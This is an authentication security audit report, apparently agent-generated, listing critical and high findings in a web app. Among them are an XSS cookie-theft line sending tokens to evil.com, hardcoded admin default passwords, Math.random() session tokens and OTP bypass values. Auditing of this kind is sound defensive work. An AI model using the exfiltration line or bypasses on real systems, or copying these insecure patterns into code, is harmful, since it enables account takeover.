# Phase 2: CRITICAL & HIGH Severity Findings

**Audit Date:** 2026-02-05  
**Agent:** AUTH-SEC  
**Total Issues:** 7 (2 CRITICAL, 5 HIGH)

---

## 🔴 CRITICAL FINDINGS (P0 - BLOCKING)

### CRIT-1: Database Schema Mismatch - Auth System Broken

**Severity:** 🔴 CRITICAL  
**Impact:** Authentication security features are non-functional  
**CVSS Score:** 9.1 (Critical)

**Issue:**
The `apps/web/lib/auth-security.ts` module implements token rotation, refresh tokens, and account lockout using raw SQL queries that reference **non-existent database tables**:

- `refresh_tokens` - Lines 150-166, 188-199, 227-274
- `login_attempts` - Lines 313-320, 363-366
- `login_lockouts` - Lines 292-301, 386-405

**Evidence:**
```sql
-- Database query result:
SELECT table_name FROM information_schema.tables 
WHERE table_name IN ('refresh_tokens', 'login_attempts', 'login_lockouts');

-- Result: 0 tables found (only Supabase auth.refresh_tokens exists)
```

**Impact:**
- ❌ **Login endpoint** - Calls to `checkLoginAllowed()`, `recordLoginAttempt()`, `createTokenPair()` throw database errors
- ❌ **Refresh endpoint** - Token refresh completely broken
- ❌ **Account lockout** - No brute force protection
- ❌ **Token rotation** - Compromised refresh tokens can be reused indefinitely

**Current Failure Mode:**
```typescript
// /api/auth/login calls:
await createTokenPair(...) 
  → INSERT INTO refresh_tokens ... 
    → ERROR: relation "refresh_tokens" does not exist
```

**Workaround Currently in Production:**
```typescript
// apps/web/app/api/auth/otp/verify/route.ts:81-82
// HACK: Same token used for both access and refresh
const refreshToken = accessToken;
```

---

### CRIT-2: OTP Verify Cookie - XSS Token Theft

**Severity:** 🔴 CRITICAL  
**Impact:** Authentication bypass via cross-site scripting  
**CVSS Score:** 8.8 (High)

**Location:** `apps/web/app/api/auth/otp/verify/route.ts`

**Vulnerable Code:**
```typescript
// Line 106-112
response.cookies.set('auth-token', accessToken, {
  httpOnly: false, // ❌ CRITICAL: JavaScript can access token
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',
  maxAge: 60 * 60 * 24 * 7, // 7 days
  path: '/',
});
```

**Comparison to Login Endpoint:**
```typescript
// apps/web/app/api/auth/login/route.ts:128
response.cookies.set('auth-token', tokenPair.accessToken, {
  httpOnly: true, // ✅ CORRECT
  maxAge: 60 * 60 * 24, // 24 hours (also inconsistent)
});
```

**XSS Exploit Scenario:**
1. Attacker injects stored XSS (e.g., in job description)
2. Victim logs in via OTP
3. Malicious script executes: `fetch('https://evil.com?token=' + document.cookie)`
4. Attacker receives auth token
5. **Full account takeover**

**Additional Issues:**
- Token expiration mismatch: 7 days (OTP) vs 24 hours (login)
- No refresh token cookie set (users can't refresh sessions)

---

## 🔴 HIGH FINDINGS (P0 - Pre-Production)

### HIGH-1: Admin Auth - Plaintext Password Comparison

**Severity:** 🔴 HIGH  
**Impact:** Full admin account compromise if source code leaks  
**Location:** `apps/admin/lib/auth.ts`

**Vulnerable Code:**
```typescript
// Line 8-28: Hardcoded credentials
const ADMIN_USERS: Record<string, { password: string; user: AdminUser }> = {
  'admin@campotech.com.ar': {
    password: process.env.ADMIN_PASSWORD || 'campotech-admin-2025', // ❌ Plaintext
    user: { id: 'admin-1', ... },
  },
  'kevin@campotech.com.ar': {
    password: process.env.KEVIN_PASSWORD || 'kevin-admin-2025', // ❌ Plaintext
    user: { id: 'admin-2', ... },
  },
};

// Line 36-40: No hashing
export function validateCredentials(email: string, password: string): AdminUser | null {
  const adminEntry = ADMIN_USERS[email.toLowerCase()];
  if (!adminEntry) return null;
  if (adminEntry.password !== password) return null; // ❌ String comparison
  return adminEntry.user;
}
```

**Issues:**
1. ❌ No bcrypt/argon2/scrypt hashing
2. ❌ Weak default passwords (`campotech-admin-2025`)
3. ❌ Hardcoded user list (can't revoke access without redeploying)

**Risk:**
- Source code leak (GitHub, laptop theft) → Immediate admin access
- Default passwords guessable → Brute force attack

---

### HIGH-2: Admin Session Tokens - Weak Cryptography

**Severity:** 🔴 HIGH  
**Impact:** Session hijacking via predictable tokens  
**Location:** `apps/admin/lib/auth.ts:43-46`

**Vulnerable Code:**
```typescript
export function generateSessionToken(userId: string): string {
  const timestamp = Date.now().toString(36);
  const random = Math.random().toString(36).substring(2); // ❌ NOT cryptographically secure
  return `${SESSION_PREFIX}${userId}_${timestamp}_${random}`;
}
```

**Why This is Vulnerable:**
- `Math.random()` uses Mersenne Twister (MT19937) - **deterministic and predictable**
- Can be reverse-engineered from observed token outputs
- NOT suitable for security-critical applications

**Example Token:**
```
campotech_admin_admin-1_1a2b3c4d_0.9876543210abcdef
                        ^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^
                       timestamp   Math.random() → PREDICTABLE
```

**Attack Scenario:**
1. Attacker logs in as themselves
2. Observes token pattern
3. Predicts future `Math.random()` outputs
4. Generates valid admin session tokens
5. **Hijacks active admin sessions**

---

### HIGH-3: Test Phone Number Bypass - Unconditional

**Severity:** 🔴 HIGH  
**Impact:** Authentication bypass in ALL environments  
**Location:** `apps/web/lib/otp.ts:46-59`

**Vulnerable Code:**
```typescript
// Hardcoded test prefixes
const TEST_PHONE_PREFIXES = [
  '+543516000',    // +543516000XXX
  '+5400000',      // +5400000XXXX
  '+1555000',      // +1555000XXXX
  '+549000',       // +549000XXXX
];

function isTestPhoneNumber(phone: string): boolean {
  const normalizedPhone = phone.replace(/[^+\d]/g, '');
  return TEST_PHONE_PREFIXES.some(prefix => normalizedPhone.startsWith(prefix));
  // ❌ NO environment check - works in production!
}

// Usage in OTP verify:
if (isTestPhoneNumber(normalizedPhone) && code === DEV_OTP_CODE) {
  console.log(`🧪 TEST PHONE: Accepting code ${DEV_OTP_CODE} for ${normalizedPhone}`);
  return { success: true }; // ❌ Bypasses OTP in production
}
```

**Attack Scenario:**
1. Attacker registers with phone `+543516000123`
2. Requests OTP → No SMS sent
3. Enters code `123456`
4. ✅ **Authenticated** without phone verification
5. Creates malicious organization with verified test number

**Impact:**
- Phone verification completely bypassed
- Unlimited account creation
- SMS sending costs avoided by attackers

---

### HIGH-4: Dev Bypass in Production Code

**Severity:** 🔴 HIGH  
**Impact:** Complete authentication bypass if misconfigured  
**Location:** `apps/web/lib/otp.ts:38-44`

**Vulnerable Code:**
```typescript
function isDevBypassAllowed(): boolean {
  return process.env.NODE_ENV === 'development' || process.env.ALLOW_DEV_OTP === 'true';
  // ⚠️ If ALLOW_DEV_OTP is set in production...
}

const DEV_OTP_CODE = '123456';

// Usage:
if (isDevBypassAllowed() && code === DEV_OTP_CODE) {
  console.log(`🔓 DEV MODE: Accepting bypass code for ${normalizedPhone}`);
  return { success: true }; // ❌ Bypasses OTP, lockout, rate limiting
}
```

**Risk:**
- **IF** production environment sets `ALLOW_DEV_OTP=true` (misconfiguration):
  - ❌ Any phone number can login with code `123456`
  - ❌ No SMS verification required
  - ❌ Complete authentication bypass

**Likelihood:** Low (requires misconfiguration)  
**Impact:** Critical (total auth bypass)  
**Overall:** HIGH

---

### HIGH-5: OTP Verify - Missing HttpOnly (Duplicate)

**This is the same issue as CRIT-2**

Consolidated into CRIT-2 above.

---

## RISK SUMMARY

| Finding | Severity | Exploitability | Impact | Current State |
|---------|----------|----------------|--------|---------------|
| CRIT-1: Database Schema | 🔴 CRITICAL | N/A | Auth features broken | ❌ NON-FUNCTIONAL |
| CRIT-2: OTP Cookie XSS | 🔴 CRITICAL | High | Account takeover | ❌ VULNERABLE |
| HIGH-1: Admin Plaintext | 🔴 HIGH | Medium | Admin compromise | ❌ NO HASHING |
| HIGH-2: Admin Weak Crypto | 🔴 HIGH | Medium | Session hijacking | ❌ Math.random() |
| HIGH-3: Test Phone Bypass | 🔴 HIGH | High | Auth bypass | ❌ PRODUCTION ACTIVE |
| HIGH-4: Dev Bypass Risk | 🔴 HIGH | Low | Total bypass | ⚠️ CONDITIONAL |

**Overall Phase 2 Security Score:** 4.5/10 (Failing)

---

## NEXT STEPS

1. ✅ **Review this summary** with security team
2. ✅ **Execute remediation checklist** (see REMEDIATION_CHECKLIST.md)
3. ✅ **Re-audit** after fixes implemented
4. ❌ **DO NOT proceed to Phase 3** until CRIT-1 and CRIT-2 are resolved

---

**Generated:** 2026-02-05 13:39:24 EST  
**Agent:** AUTH-SEC  
**Full Report:** `phase-2-authentication-findings.md`
